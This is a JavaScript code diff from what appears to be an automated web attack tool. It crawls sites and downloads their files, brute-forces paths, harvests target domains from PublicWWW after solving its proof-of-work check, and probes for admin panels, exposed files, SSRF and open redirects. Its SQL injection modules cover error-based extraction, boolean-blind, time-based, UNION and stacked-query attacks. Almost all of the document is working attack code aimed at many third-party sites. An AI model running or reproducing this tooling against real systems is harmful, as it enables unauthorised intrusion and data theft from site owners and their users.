+  while (queue.length && visited.size < CRAWL_MAX && !abortFlag) {
+    if (pausedFlag) { await waitResume(); if (abortFlag) break; }
+    const batch = [];
+    while (queue.length && batch.length < CRAWL_CONC && visited.size + batch.length < CRAWL_MAX) {
+      const u = queue.shift();
+      const norm = u.split('#')[0].split('?')[0].replace(/\/$/, '');
+      if (visited.has(norm)) continue;
+      visited.add(norm);
+      batch.push(u);
+      if (u.includes('?') && [...new URL(u).searchParams.keys()].length) vulnQueue.add(u);
+    }
+    if (!batch.length) break;
+    batchNo++;
+    tlog(L, 'o', 'BFS batch #' + batchNo + ' - size ' + batch.length + ' - visited ' + visited.size, 'hdr');
+    const results = await Promise.allSettled(batch.map(u => httpFetch(u, { logId: L })));
+    for (let i = 0; i < results.length; i++) {
+      const r = results[i], u = batch[i];
+      if (r.status !== 'fulfilled') continue;
+      const res = r.value;
+      if (res.status >= 400) continue;
+      const ct = res.headers['content-type'] || '';
+      const scan = scanAll(res, u, L);
+      for (const g of scan.gateways) for (const ep of (GATEWAY_ENDPOINTS[g] || [])) extraPaths.add(origin + ep);
+      if (shouldSave(u, ct) && res.text.length < MAX_FILE) {
+        const safe = (new URL(u).hostname + new URL(u).pathname).replace(/[^a-z0-9._/-]/gi, '_');
+        queueDownload(safe, res.text, u, L); savedFiles++;
+      }
+      if (/html/i.test(ct)) {
+        const links = extractLinks(res.text, u); let newLinks = 0;
+        for (const l of links) {
+          try {
+            if (new URL(l).hostname === domain) {
+              const norm = l.split('#')[0].split('?')[0].replace(/\/$/, '');
+              if (!visited.has(norm)) { queue.push(l); newLinks++; if (l.includes('?')) vulnQueue.add(l); }
+            }
+          } catch {}
+        }
+        if (newLinks) tlog(L, '.', '  +' + newLinks + ' new links', 'dim');
+      }
+      if (/javascript/i.test(ct) && res.text.length < 2 * 1024 * 1024) {
+        const spaRoutes = extractSpaRoutes(res.text); let spaNew = 0;
+        for (const p of spaRoutes) {
+          try {
+            const full = p.startsWith('http') ? p : origin + p;
+            if (new URL(full).hostname !== domain) continue;
+            const norm = full.split('#')[0].split('?')[0].replace(/\/$/, '');
+            if (!visited.has(norm)) { queue.push(full); spaNew++; }
+          } catch {}
+        }
+        if (spaNew) tlog(L, '@', '  SPA: +' + spaNew + ' routes', 'gw');
+      }
+    }
+    updateProgress(Math.min(25, (visited.size / CRAWL_MAX) * 25), 'phase1 - crawl ' + visited.size + '/' + CRAWL_MAX);
+    await sleep(15);
+  }
+
+  tlog(L, '>', 'PHASE 2 - path probe', 'hdr');
+  if (!abortFlag) {
+    const allPaths = [...new Set(PATHS.map(p => p.replace(/^\//, '')))];
+    tlog(L, '.', 'wordlist: ' + allPaths.length, 'dim');
+    const targets = [];
+    for (const p of allPaths) {
+      const u = (p.startsWith('http') ? p : origin + '/' + (p.startsWith('/') ? p.slice(1) : p)).replace(/\/$/, '');
+      const norm = u.split('#')[0].split('?')[0].replace(/\/$/, '');
+      if (visited.has(norm)) continue;
+      visited.add(norm); targets.push(u);
+    }
+    let idx = 0, reported = 0;
+    const worker = async () => {
+      while (idx < targets.length && !abortFlag) {
+        if (pausedFlag) { await waitResume(); if (abortFlag) break; }
+        const u = targets[idx++]; probedPaths++;
+        try {
+          const res = await httpFetch(u, { redirect: 'manual', ms: 15000, logId: L });
+          if ([200, 201, 203, 206, 301, 302, 307, 308, 401, 403].includes(res.status)) {
+            hitPaths++;
+            const ct = res.headers['content-type'] || '';
+            scanAll(res, u, L);
+            if (shouldSave(u, ct) && res.text.length < MAX_FILE) {
+              const safe = (new URL(u).hostname + new URL(u).pathname).replace(/[^a-z0-9._/-]/gi, '_');
+              queueDownload(safe, res.text, u, L); savedFiles++;
+            }
+            if (u.includes('?')) vulnQueue.add(u);
+          }
+        } catch (e) { }
+        if (probedPaths - reported >= 50) { reported = probedPaths; tlog(L, '.', 'PROGRESS ' + probedPaths + '/' + targets.length + ' - hits=' + hitPaths + ' - findings=' + state.findings.length, 'dim'); }
+        if (probedPaths % 30 === 0) updateProgress(25 + (probedPaths / Math.max(1, targets.length)) * 45, 'phase2 - ' + probedPaths + '/' + targets.length + ' - ' + hitPaths + ' hits');
+      }
+    };
+    await Promise.all(Array.from({ length: PROBE_CONC }, worker));
+    tlog(L, '.', 'phase2 done - probed=' + probedPaths + ' hits=' + hitPaths, 'dim');
+  }
+
+  tlog(L, '>', 'PHASE 3 - vuln scan (' + vulnQueue.size + ' urls)', 'hdr');
+  if (!abortFlag && vulnQueue.size) {
+    const arr = [...vulnQueue]; let idx = 0, done = 0;
+    const worker = async () => {
+      while (idx < arr.length && !abortFlag) {
+        if (pausedFlag) { await waitResume(); if (abortFlag) break; }
+        const u = arr[idx++];
+        const n = await vulnScanUrl(u, L);
+        vulnHits += n; done++;
+        if (done % 3 === 0) updateProgress(70 + (done / Math.max(1, arr.length)) * 30, 'phase3 - ' + done + '/' + arr.length + ' - ' + vulnHits + ' vulns');
+      }
+    };
+    await Promise.all(Array.from({ length: VULN_CONC }, worker));
+  }
+  tlog(L, '=', 'DONE ' + base + ' - hits=' + hitPaths + ' files=' + savedFiles + ' vulns=' + vulnHits, 'hit');
+  return { files: savedFiles, hits: hitPaths, probed: probedPaths, vulns: vulnHits, gateways: state.gateways.size };
+}
+
+/* ===== PUBLICWWW ===== */
+async function publicwwwSearch(query, maxUrls, logId) {
+  logId = logId || 'dorkLog';
+  const L = logId;
+  tlog(L, '>', 'PUBLICWWW query: ' + query + ' (max ' + maxUrls + ')', 'hdr');
+  const live = pool.filter(w => w.ok && !w.dead);
+  if (!live.length) { tlog(L, 'x', 'no live workers', 'bad'); return []; }
+  const worker = live[0];
+  const baseHeaders = { 'User-Agent': ua(), 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Referer': 'https://publicwww.com/' };
+  let cookieHeader = '';
+  const fetchPinned = (url, extra) => {
+    extra = extra || {};
+    const headers = Object.assign({}, baseHeaders, extra.headers || {});
+    if (cookieHeader) headers.Cookie = headers.Cookie ? headers.Cookie + '; ' + cookieHeader : cookieHeader;
+    return httpFetch(url, Object.assign({}, extra, { worker: worker, headers: headers, logId: L }));
+  };
+  const q = encodeURIComponent(query).replace(/%2F/g, '/');
+  const landing = 'https://publicwww.com/websites/' + q + '/';
+  const exportUrl = 'https://publicwww.com/websites/' + q + '/?export=urls';
+  const isResults = t => /-\s*\d[\d,]*\s*Web pages\s*-\s*PublicWWW\.com/i.test(t) || /Examples of sites using/i.test(t);
+  let r = await fetchPinned(landing);
+  if (r.status !== 200) return [];
+  if (!isResults(r.text)) {
+    tlog(L, 'o', 'solving PoW...', 'warn');
+    const solved = solvePoW(r.text);
+    if (!solved) { tlog(L, 'x', 'PoW failed', 'bad'); return []; }
+    tlog(L, '+', 'PoW solved - tries=' + solved.tries, 'hit');
+    cookieHeader = '_t=' + encodeURIComponent(solved.token);
+    r = await fetchPinned(landing);
+    if (r.status !== 200) return [];
+    if (!isResults(r.text)) { tlog(L, 'x', 'still not results', 'bad'); return []; }
+    tlog(L, '+', 'results reached', 'hit');
+  }
+  tlog(L, '>', 'fetching export...', 'hdr');
+  let ex = await fetchPinned(exportUrl, { headers: { Accept: 'text/plain' } });
+  if (ex.status !== 200) return [];
+  let lines = ex.text.split('\n').map(l => l.trim()).filter(l => l.startsWith('http'));
+  if (!lines.length && !isResults(ex.text)) {
+    tlog(L, 'o', 'PoW on export...', 'warn');
+    const solved = solvePoW(ex.text);
+    if (!solved) return [];
+    cookieHeader = '_t=' + encodeURIComponent(solved.token);
+    ex = await fetchPinned(exportUrl, { headers: { Accept: 'text/plain' } });
+    lines = ex.text.split('\n').map(l => l.trim()).filter(l => l.startsWith('http'));
+  }
+  const out = [], seen = new Set();
+  for (const line of lines) {
+    try {
+      const u = new URL(line);
+      let host = u.hostname.toLowerCase();
+      if (host.startsWith('www.')) host = host.slice(4);
+      if (!seen.has(host)) { seen.add(host); out.push('https://' + host); tlog(L, '.', 'domain: ' + host, 'dim'); }
+      if (out.length >= maxUrls) break;
+    } catch {}
+  }
+  tlog(L, '+', 'exported ' + out.length + ' domains', out.length ? 'hit' : 'warn');
+  return out;
+}
+
+/* ===== MODULE SCANNER ===== */
+let modFindings = {};
+let modCounts = {};
+let _testableModUrls = [];
+function modCheckAbort() { if (abortFlag) { const e = new Error('Aborted'); e.name = 'AbortError'; throw e; } }
+function mlog(type, module, msg) {
+  const glyphMap = { info: '.', vuln: 'X', warn: '!', ok: '+', dir: '>', crawl: 'L' };
+  const clsMap = { info: 'dim', vuln: 'vuln', warn: 'warn', ok: 'hit', dir: 'ok', crawl: 'gw' };
+  tlog('moduleLog', glyphMap[type] || '.', '[' + module + '] ' + msg, clsMap[type] || 'dim');
+  if (type === 'vuln' || type === 'dir') {
+    modCounts[module] = (modCounts[module] || 0) + 1;
+    const statusEl = document.getElementById('modstatus-' + module);
+    if (statusEl) { statusEl.textContent = 'vuln ' + modCounts[module]; statusEl.className = 'mod-status error'; }
+  }
+}
+function mAddFinding(module, obj) {
+  if (!modFindings[module]) modFindings[module] = [];
+  modFindings[module].push(obj);
+  if (obj.url && obj.issue) addFinding(module.charAt(0).toUpperCase() + module.slice(1) + ': ' + obj.issue, obj.url, obj.url, 'FORMAT_VALID');
+}
+function setModStatus(id, s) {
+  const el = document.getElementById('modstatus-' + id);
+  if (el) { el.textContent = s; el.className = 'mod-status ' + (s === 'running' ? 'running' : s === 'done' ? 'done' : s === 'error' ? 'error' : 'idle'); }
+}
+
+async function runHeaders(target) {
+  setModStatus('headers', 'running');
+  mlog('info', 'headers', 'Checking security headers on ' + target);
+  try {
+    const r = await httpMod(target); const h = r.headers;
+    const checks = [
+      ['strict-transport-security', 'HSTS missing'],
+      ['content-security-policy', 'CSP missing'],
+      ['x-content-type-options', 'X-Content-Type-Options missing'],
+      ['x-frame-options', 'X-Frame-Options missing'],
+      ['referrer-policy', 'Referrer-Policy missing'],
+      ['permissions-policy', 'Permissions-Policy missing']
+    ];
+    let missing = 0;
+    for (const c of checks) { const hdr = c[0], msg = c[1]; if (!h[hdr]) { mlog('vuln', 'headers', 'MISSING: ' + msg); mAddFinding('headers', { url: target, issue: msg }); missing++; } else mlog('ok', 'headers', 'PRESENT: ' + hdr); }
+    if (h['server']) { mlog('vuln', 'headers', 'Server header: ' + h['server']); mAddFinding('headers', { url: target, issue: 'Server disclosure: ' + h['server'] }); }
+    if (h['x-powered-by']) { mlog('vuln', 'headers', 'X-Powered-By: ' + h['x-powered-by']); mAddFinding('headers', { url: target, issue: 'Tech disclosure: ' + h['x-powered-by'] }); }
+    if (missing === 0) mlog('ok', 'headers', 'All key headers present');
+  } catch (e) { if (e.name === 'AbortError') throw e; mlog('warn', 'headers', 'Error: ' + e.message); }
+  setModStatus('headers', 'done');
+}
+
+async function runSSL(target) {
+  setModStatus('ssl', 'running');
+  mlog('info', 'ssl', 'Checking SSL/TLS');
+  if (!target.startsWith('https://')) { mlog('vuln', 'ssl', 'No HTTPS'); mAddFinding('ssl', { url: target, issue: 'No HTTPS' }); }
+  else {
+    mlog('ok', 'ssl', 'HTTPS in use');
+    const http = target.replace('https://', 'http://');
+    try { const r = await httpMod(http); if (r.status >= 200 && r.status < 400 && !r.redirected) { mlog('vuln', 'ssl', 'HTTP accessible without redirect'); mAddFinding('ssl', { url: http, issue: 'HTTP accessible' }); } } catch {}
+    try {
+      const r = await httpMod(target); const hsts = r.headers['strict-transport-security'];
+      if (!hsts) { mlog('vuln', 'ssl', 'HSTS missing'); mAddFinding('ssl', { url: target, issue: 'Missing HSTS' }); }
+      else { const ma = (hsts.match(/max-age=(\d+)/i) || [])[1]; if (ma && parseInt(ma) < 2592000) { mlog('vuln', 'ssl', 'HSTS max-age too short: ' + ma); } else mlog('ok', 'ssl', 'HSTS: ' + hsts); }
+    } catch (e) { if (e.name === 'AbortError') throw e; }
+  }
+  setModStatus('ssl', 'done');
+}
+
+async function runCORS(target) {
+  setModStatus('cors', 'running');
+  mlog('info', 'cors', 'Checking CORS');
+  const origins = ['https://evil.com', 'null', 'https://attacker.com'];
+  for (const origin of origins) {
+    modCheckAbort();
+    try {
+      const r = await httpMod(target, { headers: { 'Origin': origin } });
+      const acao = r.headers['access-control-allow-origin']; const acac = r.headers['access-control-allow-credentials'];
+      if (acao) {
+        if (acao === '*') { mlog('vuln', 'cors', 'Wildcard CORS (*)'); mAddFinding('cors', { url: target, issue: 'Wildcard CORS', origin: origin }); }
+        else if (acao === origin) { if (acac === 'true') { mlog('vuln', 'cors', 'Reflects origin with credentials: ' + origin); mAddFinding('cors', { url: target, issue: 'Reflected CORS with credentials' }); } else mlog('info', 'cors', 'Reflects origin (no creds): ' + origin); }
+      }
+    } catch (e) { if (e.name === 'AbortError') throw e; }
+  }
+  setModStatus('cors', 'done');
+}
+
+async function runClickjacking(target) {
+  setModStatus('clickjacking', 'running');
+  mlog('info', 'clickjacking', 'Checking clickjacking protection');
+  try {
+    const r = await httpMod(target);
+    const xfo = r.headers['x-frame-options'], csp = r.headers['content-security-policy'];
+    let ok = false;
+    if (xfo) { const v = xfo.toUpperCase(); if (v === 'DENY' || v === 'SAMEORIGIN') { mlog('ok', 'clickjacking', 'X-Frame-Options: ' + xfo); ok = true; } else { mlog('vuln', 'clickjacking', 'Weak XFO: ' + xfo); mAddFinding('clickjacking', { url: target, issue: 'Weak XFO' }); } }
+    if (csp && csp.includes('frame-ancestors')) { mlog('ok', 'clickjacking', 'CSP frame-ancestors'); ok = true; }
+    if (!ok) { mlog('vuln', 'clickjacking', 'No clickjacking protection'); mAddFinding('clickjacking', { url: target, issue: 'Missing clickjacking protection' }); }
+  } catch (e) { if (e.name === 'AbortError') throw e; }
+  setModStatus('clickjacking', 'done');
+}
+
+async function runCookies(target) {
+  setModStatus('cookies', 'running');
+  mlog('info', 'cookies', 'Cookie flags');
+  try {
+    const r = await httpMod(target);
+    const cookieLines = r.headers['set-cookie'] ? [r.headers['set-cookie']] : [];
+    if (!cookieLines.length) mlog('info', 'cookies', 'No Set-Cookie found');
+    for (const c of cookieLines) {
+      const low = c.toLowerCase(), name = c.split('=')[0];
+      if (!low.includes('httponly')) { mlog('vuln', 'cookies', '[' + name + '] missing HttpOnly'); mAddFinding('cookies', { url: target, cookie: name, issue: 'Missing HttpOnly' }); }
+      if (!low.includes('secure')) { mlog('vuln', 'cookies', '[' + name + '] missing Secure'); mAddFinding('cookies', { url: target, cookie: name, issue: 'Missing Secure' }); }
+      if (!low.includes('samesite')) { mlog('vuln', 'cookies', '[' + name + '] missing SameSite'); mAddFinding('cookies', { url: target, cookie: name, issue: 'Missing SameSite' }); }
+    }
+  } catch (e) { if (e.name === 'AbortError') throw e; }
+  setModStatus('cookies', 'done');
+}
+
+async function runCacheCheck(target) {
+  setModStatus('cachecheck', 'running');
+  mlog('info', 'cachecheck', 'Cache headers');
+  try {
+    const r = await httpMod(target); const cc = r.headers['cache-control'];
+    if (!cc) { mlog('vuln', 'cachecheck', 'Cache-Control missing'); mAddFinding('cachecheck', { url: target, issue: 'Missing Cache-Control' }); }
+    else { mlog('info', 'cachecheck', 'Cache-Control: ' + cc); if (!cc.includes('no-store') && !cc.includes('no-cache') && !cc.includes('private')) { mlog('vuln', 'cachecheck', 'Allows caching'); mAddFinding('cachecheck', { url: target, issue: 'Cache-Control allows caching' }); } }
+  } catch (e) { if (e.name === 'AbortError') throw e; }
+  setModStatus('cachecheck', 'done');
+}
+
+async function runInfoDisclose(target) {
+  setModStatus('infodisclosure', 'running');
+  mlog('info', 'infodisclosure', 'Info disclosure');
+  try {
+    const r = await httpMod(target); const txt = r.text;
+    const patterns = [
+      [/[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}/g, 'Email'],
+      [/(?:password|passwd|pwd)\s*[:=]\s*["']?[^\s"'<>{}\[\]]+/gi, 'Hardcoded password'],
+      [/(?:api[_-]?key|apikey|api[_-]?secret)\s*[:=]\s*["']?[a-zA-Z0-9\-_]{16,}/gi, 'API key'],
+      [/(?:AKIA|AROA|AIDA)[A-Z0-9]{16}/g, 'AWS key'],
+      [/-----BEGIN\s+(?:RSA\s+|EC\s+|OPENSSH\s+)?PRIVATE KEY-----/g, 'PEM key']
+    ];
+    for (const p of patterns) { const re = p[0], desc = p[1]; const m = txt.match(re); if (m && m.length > 0) { const preview = m[0].slice(0, 60); mlog('vuln', 'infodisclosure', desc + ': ' + preview); mAddFinding('infodisclosure', { url: target, issue: desc, preview: preview }); } }
+    if (r.headers['server']) mlog('vuln', 'infodisclosure', 'Server: ' + r.headers['server']);
+    if (r.headers['x-powered-by']) mlog('vuln', 'infodisclosure', 'X-Powered-By: ' + r.headers['x-powered-by']);
+  } catch (e) { if (e.name === 'AbortError') throw e; }
+  setModStatus('infodisclosure', 'done');
+}
+
+async function runHTTPMethods(target) {
+  setModStatus('httpmethods', 'running');
+  mlog('info', 'httpmethods', 'Dangerous methods');
+  const methods = ['OPTIONS', 'TRACE', 'TRACK', 'PUT', 'DELETE'];
+  for (const method of methods) {
+    modCheckAbort();
+    try {
+      const timeout = getTimeout(), headers = { 'User-Agent': getUA() };
+      const resp = await Promise.race([fetch(target, { method: method, headers: headers, mode: 'cors', credentials: 'omit', signal: modAbortController.signal }), new Promise((_, r) => setTimeout(() => r(new Error('timeout')), timeout))]);
+      if (resp.status < 400 || resp.status === 200 || resp.status === 204) {
+        if (method === 'TRACE' || method === 'TRACK') { mlog('vuln', 'httpmethods', method + ' allowed'); mAddFinding('httpmethods', { url: target, issue: method + ' enabled' }); }
+        else if (method === 'OPTIONS') { const allow = resp.headers.get('allow') || ''; mlog('info', 'httpmethods', 'Allow: ' + allow); if (allow.includes('PUT') || allow.includes('DELETE')) { mlog('vuln', 'httpmethods', 'Dangerous: ' + allow); mAddFinding('httpmethods', { url: target, issue: 'Dangerous methods: ' + allow }); } }
+        else if (method === 'PUT' || method === 'DELETE') { mlog('vuln', 'httpmethods', method + ' responded ' + resp.status); mAddFinding('httpmethods', { url: target, issue: method + ' enabled' }); }
+        else mlog('info', 'httpmethods', method + ' responded ' + resp.status);
+      }
+    } catch (e) { if (e.name === 'AbortError') throw e; }
+  }
+  setModStatus('httpmethods', 'done');
+}
+
+async function runSubdomainTakeover(target) {
+  setModStatus('subdomaintakeover', 'running');
+  mlog('info', 'subdomaintakeover', 'Takeover fingerprint');
+  try {
+    const r = await httpMod(target); const txt = r.text.toLowerCase();
+    for (const pair of TAKEOVER_INDICATORS) { const pattern = pair[0], svc = pair[1]; if (txt.includes(pattern.toLowerCase())) { mlog('vuln', 'subdomaintakeover', '(' + svc + '): ' + pattern); mAddFinding('subdomaintakeover', { url: target, issue: svc + ' takeover indicator' }); } }
+  } catch (e) { if (e.name === 'AbortError') throw e; }
+  setModStatus('subdomaintakeover', 'done');
+}
+
+async function runBruteForceCheck(target) {
+  setModStatus('bruteforce', 'running');
+  mlog('info', 'bruteforce', 'Rate limit check');
+  const loginPaths = ['login', 'login.php', 'wp-login.php', 'admin/login', 'signin', 'auth/login'];
+  const base = target.replace(/\/$/, '');
+  for (const path of loginPaths) {
+    modCheckAbort();
+    const url = base + '/' + path;
+    try {
+      const r1 = await httpMod(url);
+      if (r1.status !== 200) continue;
+      mlog('info', 'bruteforce', 'Login form: ' + url);
+      let lockout = false;
+      for (let i = 0; i < 5; i++) { modCheckAbort(); try { const rt = await httpMod(url); if (rt.status === 429 || rt.status === 403) { lockout = true; break; } if (rt.headers['x-ratelimit-limit']) { mlog('ok', 'bruteforce', 'Rate limit: ' + url); lockout = true; break; } } catch (e) { if (e.name === 'AbortError') throw e; } }
+      if (!lockout) { mlog('vuln', 'bruteforce', 'No rate limiting: ' + url); mAddFinding('bruteforce', { url: url, issue: 'No rate limiting' }); }
+    } catch (e) { if (e.name === 'AbortError') throw e; }
+  }
+  setModStatus('bruteforce', 'done');
+}
+
+async function runAdminFinder(target) {
+  if (!target.endsWith('/')) target += '/';
+  setModStatus('adminfinder', 'running');
+  mlog('info', 'adminfinder', 'Admin panel discovery');
+  await concurrentBatch(ADMIN_PATHS, async path => {
+    const url = target + path; modCheckAbort();
+    try {
+      const r = await httpMod(url);
+      if (r.status === 200 || r.status === 301 || r.status === 302) { mlog('vuln', 'adminfinder', '[' + r.status + '] ' + url); mAddFinding('adminfinder', { url: url, status: r.status, issue: 'Admin panel found' }); }
+      else if (r.status === 401 || r.status === 403) { mlog('info', 'adminfinder', '[' + r.status + '] Protected: ' + url); mAddFinding('adminfinder', { url: url, status: r.status, issue: 'Protected admin endpoint' }); }
+    } catch (e) { if (e.name === 'AbortError') throw e; }
+  }, getConc());
+  setModStatus('adminfinder', 'done');
+}
+
+async function runAPIProbe(target) {
+  if (!target.endsWith('/')) target += '/';
+  setModStatus('apiprobe', 'running');
+  mlog('info', 'apiprobe', 'API endpoint probe');
+  await concurrentBatch(API_PATHS, async path => {
+    const url = target + path; modCheckAbort();
+    try {
+      const r = await httpMod(url, { headers: { 'Accept': 'application/json' } });
+      if (r.status === 200) { const isJson = r.headers['content-type'] && r.headers['content-type'].includes('json'); if (isJson && r.text.length > 10) { mlog('vuln', 'apiprobe', 'API exposes data: ' + url); mAddFinding('apiprobe', { url: url, issue: 'Unauthenticated API response' }); } else mlog('info', 'apiprobe', '[200] ' + url); }
+      else if (r.status === 401 || r.status === 403) mlog('info', 'apiprobe', '[' + r.status + '] Protected: ' + url);
+      else if (r.status === 405) { mlog('info', 'apiprobe', '[405] Exists: ' + url); mAddFinding('apiprobe', { url: url, issue: 'Endpoint exists (405)' }); }
+    } catch (e) { if (e.name === 'AbortError') throw e; }
+  }, getConc());
+  setModStatus('apiprobe', 'done');
+}
+
+async function runSensitiveFiles(target) {
+  if (!target.endsWith('/')) target += '/';
+  setModStatus('sensitivefiles', 'running');
+  mlog('info', 'sensitivefiles', 'Sensitive file check');
+  await concurrentBatch(SENSITIVE_FILES, async file => {
+    const url = target + file; modCheckAbort();
+    try {
+      const r = await httpMod(url);
+      if (r.status === 200) { mlog('vuln', 'sensitivefiles', '[200] Exposed: ' + url); mAddFinding('sensitivefiles', { url: url, status: 200, issue: 'Sensitive file exposed' }); }
+      else if (r.status === 403) mlog('info', 'sensitivefiles', '[403] Forbidden: ' + url);
+    } catch (e) { if (e.name === 'AbortError') throw e; }
+  }, getConc());
+  setModStatus('sensitivefiles', 'done');
+}
+
+async function runDirbust(target) {
+  if (!target.endsWith('/')) target += '/';
+  setModStatus('dirbust', 'running');
+  mlog('info', 'dirbust', 'Brute-forcing paths');
+  const found = new Set([target]);
+  await concurrentBatch(DIR_WORDLIST, async dir => {
+    const url = target + dir; if (found.has(url)) return; modCheckAbort();
+    try {
+      const r = await httpMod(url);
+      if (r.status === 404 || r.status === 410) return;
+      found.add(url); mAddFinding('dirbust', { url: url, status: r.status, issue: 'Path found: ' + dir });
+      const suf = r.redirected && r.finalUrl && r.finalUrl !== url ? ' -> ' + r.finalUrl : '';
+      mlog('dir', 'dirbust', '[' + r.status + '] ' + url + suf);
+    } catch (e) { if (e.name === 'AbortError') throw e; }
+  }, getConc());
+  mlog('ok', 'dirbust', 'Done. ' + (found.size - 1) + ' paths found.');
+  setModStatus('dirbust', 'done');
+}
+
+async function runModuleCrawler(target) {
+  setModStatus('crawler', 'running');
+  mlog('info', 'crawler', 'Crawling: ' + target);
+  if (!target.endsWith('/')) target += '/';
+  const urls = new Set();
+  const fetchLinks = async base => {
+    try {
+      const r = await httpMod(base);
+      const doc = (new DOMParser()).parseFromString(r.text, 'text/html');
+      for (const a of doc.querySelectorAll('a[href]')) {
+        let h = a.getAttribute('href'); if (!h || h.includes('#')) continue;
+        if (!h.startsWith('http')) { if (h.startsWith('/')) h = target + h.slice(1); else h = base + h; }
+        if (h.startsWith(target)) urls.add(h);
+      }
+    } catch (e) { if (e.name === 'AbortError') throw e; }
+  };
+  await fetchLinks(target);
+  if (urls.size < 25) { const extra = [...urls].slice(0, 15); for (const u of extra) { modCheckAbort(); await fetchLinks(u).catch(() => {}); } }
+  for (const u of urls) { mlog('crawl', 'crawler', u); mAddFinding('crawler', { url: u }); }
+  mlog('ok', 'crawler', 'Found ' + urls.size + ' URLs');
+  setModStatus('crawler', 'done');
+  return urls;
+}
+
+async function runOpenRedirect(target) {
+  setModStatus('openredirect', 'running');
+  mlog('info', 'openredirect', 'Open redirect');
+  const base = target.replace(/\/$/, '');
+  for (const param of REDIR_PARAMS) {
+    for (const pay of REDIR_PAY) {
+      modCheckAbort();
+      const testUrl = base + '?' + param + '=' + encodeURIComponent(pay);
+      try {
+        const r = await httpMod(testUrl);
+        const loc = r.headers['location'] || '';
+        if (loc.includes('evil.com') || (r.finalUrl && r.finalUrl.includes('evil.com'))) { mlog('vuln', 'openredirect', 'Open redirect [' + param + ']: ' + testUrl); mAddFinding('openredirect', { url: testUrl, param: param, payload: pay, issue: 'Open redirect' }); break; }
+      } catch (e) { if (e.name === 'AbortError') throw e; }
+    }
+  }
+  setModStatus('openredirect', 'done');
+}
+
+async function runSSRFModule(target) {
+  setModStatus('ssrf', 'running');
+  mlog('info', 'ssrf', 'SSRF probe');
+  const base = target.replace(/\/$/, '');
+  for (const param of SSRF_PARAMS) {
+    for (const pay of SSRF_PAY) {
+      modCheckAbort();
+      const testUrl = base + '?' + param + '=' + encodeURIComponent(pay);
+      try {
+        const r = await httpMod(testUrl);
+        if (r.status === 200 && SSRF_SIGNS.some(s => r.text.includes(s))) { mlog('vuln', 'ssrf', 'SSRF [' + param + ']: ' + testUrl); mAddFinding('ssrf', { url: testUrl, param: param, payload: pay, issue: 'SSRF confirmed' }); break; }
+      } catch (e) { if (e.name === 'AbortError') throw e; }
+    }
+  }
+  setModStatus('ssrf', 'done');
+}
+
+const modTested = { sqli: new Set(), lfi: new Set(), xss: new Set() };
+
+async function testSQLiErrorBased(base, pn, baselineText) {
+  const key = base + '?' + pn;
+  const probes = ["'", '"', '\\', "1'", '1"', "'--", "'#", "1' AND 1=1-- -"];
+  for (const pay of probes) {
+    modCheckAbort();
+    try {
+      const r = await httpMod(key + '=' + encodeURIComponent(pay));
+      const low = (r.text || '').toLowerCase();
+      for (const e of Object.entries(SQLI_ERR)) {
+        const dbms = e[0], sigs = e[1];
+        for (const sig of sigs) {
+          if (low.includes(sig) && !(baselineText && baselineText.toLowerCase().includes(sig))) {
+            mlog('vuln', 'sqli', '[ERROR][' + dbms + '] param=[' + pn + '] sig="' + sig + '"');
+            mAddFinding('sqli', { technique: 'error-based', dbms: dbms, url: key + '=' + encodeURIComponent(pay), param: pn, payload: pay, sig: sig });
+            return { found: true, dbms: dbms };
+          }
+        }
+      }
+    } catch (e) { if (e.name === 'AbortError') throw e; }
+  }
+  return { found: false };
+}
+
+async function testSQLiErrorExtract(base, pn, dbms) {
+  const key = base + '?' + pn;
+  mlog('info', 'sqli', '[EXTRACT] param=[' + pn + '] dbms=' + dbms);
+  for (const pay of SQLI_EXTRACT) {
+    modCheckAbort();
+    try { const r = await httpMod(key + '=' + encodeURIComponent(pay)); const m = (r.text || '').match(/~([^~]{3,80})~/); if (m) { mlog('vuln', 'sqli', '[EXTRACT] ' + m[1]); mAddFinding('sqli', { technique: 'extract', dbms: dbms, url: key, param: pn, extracted: m[1] }); return; } } catch (e) { if (e.name === 'AbortError') throw e; }
+  }
+}
+
+async function testSQLiBooleanBlind(base, pn) {
+  const key = base + '?' + pn;
+  for (const pair of SQLI_BOOL) {
+    modCheckAbort();
+    const trueP = pair[0], falseP = pair[1];
+    try {
+      const rT = await httpMod(key + '=' + encodeURIComponent(trueP)).catch(() => null);
+      const rF = await httpMod(key + '=' + encodeURIComponent(falseP)).catch(() => null);
+      if (!rT || !rF) continue;
+      const diff = Math.abs(rT.text.length - rF.text.length);
+      if (diff > 50 || rT.status !== rF.status) { mlog('vuln', 'sqli', '[BOOLEAN] param=[' + pn + '] diff=' + diff); mAddFinding('sqli', { technique: 'boolean-blind', url: key, param: pn, diff: diff }); return true; }
+    } catch (e) { if (e.name === 'AbortError') throw e; }
+  }
+  return false;
+}
+
+async function testSQLiTimeBased(base, pn) {
+  const key = base + '?' + pn;
+  for (const test of SQLI_TIME) {
+    modCheckAbort();
+    const t0 = performance.now();
+    try { await httpMod(key + '=' + encodeURIComponent(test.pay)); const dt = performance.now() - t0; if (dt >= test.thresh) { mlog('vuln', 'sqli', '[TIME][' + test.dbms + '] ' + dt.toFixed(0) + 'ms'); mAddFinding('sqli', { technique: 'time-based', dbms: test.dbms, url: key, param: pn, payload: test.pay, elapsed: dt }); return true; } } catch (e) { if (e.name === 'AbortError') throw e; }
+  }
+  return false;
+}
+
+async function testSQLiUnion(base, pn) {
+  const key = base + '?' + pn;
+  for (let cols = 1; cols <= 10; cols++) {
+    modCheckAbort();
+    const pay = "' UNION SELECT " + Array(cols).fill('NULL').join(',') + '-- -';
+    try {
+      const r = await httpMod(key + '=0' + encodeURIComponent(pay));
+      const low = (r.text || '').toLowerCase();
+      if (!low.includes('column') && !low.includes('operand') && r.status === 200 && r.text.length > 0) {
+        mlog('vuln', 'sqli', '[UNION] ' + cols + '-col');
+        mAddFinding('sqli', { technique: 'union', url: key, param: pn, columns: cols });
+        return true;
+      }
+    } catch (e) { if (e.name === 'AbortError') throw e; }
+  }
+  return false;
+}
+
+async function testSQLiStacked(base, pn) {
+  const key = base + '?' + pn;
+  for (const pay of SQLI_STACKED) {
+    modCheckAbort();
+    try { const r = await httpMod(key + '=' + encodeURIComponent(pay)); if (r.status === 200) mlog('info', 'sqli', '[STACKED] may be supported: ' + pay); } catch (e) { if (e.name === 'AbortError') throw e; }
+  }
+}
+
+async function testSQLiAuthBypass(target) {
+  const loginPaths = ['login', 'login.php', 'admin/login', 'wp-login.php', 'signin', 'auth/login'];
